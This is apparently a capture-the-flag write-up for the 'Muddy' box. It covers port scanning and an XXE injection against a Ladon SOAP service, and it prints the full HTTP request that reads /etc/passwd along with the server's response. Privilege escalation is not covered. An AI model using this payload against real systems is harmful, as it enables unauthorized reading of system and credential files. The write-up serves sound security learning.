#Linux #XXE #SOAP #Ladon #VirtualHost #LFI #InfoDisclosure

## Overview

Muddy runs a Ladon SOAP web service on port 8888 that is vulnerable to XML External Entity (XXE) injection, allowing arbitrary local file reads. The initial scan also reveals the host uses a virtual hostname (`muddy.ugc`), which is needed to reach the service. These notes cover recon and the XXE LFI demonstration; privilege escalation and root are not documented.

> **Note:** these notes are incomplete, covers recon through XXE file read on port 8888; privilege escalation and root are not documented.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp   open  smtp          Exim smtpd
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-title: Did not follow redirect to http://muddy.ugc/
111/tcp  open  rpcbind
443/tcp  open  https?
808/tcp  open  ccproxy-http?
8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
|_http-title: Ladon Service Catalog
```

Port 80 redirects to `http://muddy.ugc/`, indicating virtual host routing. Port 8888 runs a **Ladon Service Catalog**, a Python SOAP framework.

The redirect from port 80 requires adding the hostname to `/etc/hosts`:

```
muddy.ugc -> /etc/hosts
```

### Service Discovery on Port 8888

Browsing to port 8888 at `muddy.ugc:8888` showed the Ladon Service Catalog listing. The available method was `checkout`.

Searching for exploits:

```sh
searchsploit ladon
Ladon Framework for Python 0.9.40 - XML External Entity Expansion  |  xml/webapps/43113.txt
```

## Foothold

### XXE, Reading /etc/passwd via SOAP

Ladon 0.9.40 does not disable external entity processing when parsing SOAP request bodies. Sending a crafted XML payload that defines an external entity pointing at a local file causes the server to include that file's contents in the response.

> **How XXE works in SOAP services:** SOAP uses XML for its message format. XML parsers support external entities, references that load content from a URI, including `file://` paths. When a server doesn't disable this feature, an attacker can define `<!ENTITY x SYSTEM "file:///etc/passwd">` and reference `&x;` in the request body. The XML parser resolves the entity before the application sees the data, injecting the file contents into the request that the application processes and reflects back.

The PoC from the exploit DB used a `sayhello` method, but the Ladon service exposed `checkout`. I adapted the request accordingly and sent it through Burp:

```http
POST /muddy/soap HTTP/1.1
Host: muddy.ugc:8888
Content-Length: 541

<?xml version="1.0"?>
    <!DOCTYPE uid
    [<!ENTITY passwd SYSTEM "file:///etc/passwd">
    ]>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:urn="urn:HelloService">
        <soapenv:Header/>
        <soapenv:Body>
        <urn:checkout soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <uid xsi:type="xsd:string">
                &passwd;
            </uid>
        </urn:checkout>
    </soapenv:Body>
    </soapenv:Envelope>
```

The server reflected `/etc/passwd` in the SOAP response body:

```http
HTTP/1.0 200 OK
<result>Serial number: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
ian:x:1000:1000::/home/ian:/bin/sh
...
</result>
```

The file read confirmed a user named `ian` with a shell. The XXE was used to read local files at will.

## Takeaways

- **Ladon SOAP services are a niche but well-documented XXE target.** `searchsploit ladon` surfaces the advisory immediately.
- **Adapt PoC method names to what the running service actually exposes.** The example used `sayhello`; replacing it with the catalog's listed `checkout` method was the only modification required.
- **LFI through XXE enables reading any file the web service process can access**, `/etc/passwd`, SSH private keys, config files with credentials. The user list from `/etc/passwd` defines the next targets.
